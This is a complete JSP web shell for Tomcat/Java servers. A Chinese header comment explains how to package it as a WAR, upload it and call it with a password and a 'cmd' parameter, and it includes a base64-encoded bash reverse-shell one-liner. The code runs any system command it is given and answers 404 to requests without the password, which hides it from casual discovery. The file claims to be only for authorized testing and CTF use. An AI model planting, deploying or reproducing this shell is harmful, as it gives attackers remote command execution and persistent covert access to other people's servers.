<%--
脚本名称: JSP 命令执行 WebShell（Tomcat/Java）
方向: Web（文件上传 / WAR 部署 / RCE）
简介:
  - GET/POST 参数 cmd 执行系统命令并原样回显；
  - 参数 pwd 为访问口令（默认 ctf，建议修改），口令不对返回 404；
  - 适用于 Tomcat 管理后台部署 WAR、文件上传解析、反序列化落地后。
用法:
  1) 改下面 PWD 的值；
  2) 保存为 x.jsp（或打入最小 WAR：jar cvf r.war x.jsp 改名 index.jsp）；
  3) 访问 http://target:8080/r/x.jsp?pwd=ctf&cmd=id
  Linux 反弹: &cmd=bash -c {echo,<base64反弹命令>}|{base64,-d}|{bash,-i}
  Windows:    &cmd=whoami
注意: 仅限授权测试与 CTF 靶场。
--%><%@ page import="java.io.*,java.util.*" %><%!
    String PWD = "ctf";
    String run(String cmd, String os) throws Exception {
        List<String> c = new ArrayList<String>();
        if (os.toLowerCase().contains("win")) { c.add("cmd.exe"); c.add("/c"); }
        else { c.add("/bin/sh"); c.add("-c"); }
        c.add(cmd);
        Process p = new ProcessBuilder(c).redirectErrorStream(true).start();
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line; while ((line = br.readLine()) != null) sb.append(line).append('\n');
        p.waitFor();
        return sb.toString();
    }
%><%
    String pwd = request.getParameter("pwd");
    if (!PWD.equals(pwd)) { response.setStatus(404); return; }
    String cmd = request.getParameter("cmd");
    response.setContentType("text/plain;charset=UTF-8");
    if (cmd == null) { out.print("usage: ?pwd=" + PWD + "&cmd=id"); return; }
    out.print(run(cmd, System.getProperty("os.name")));
%>
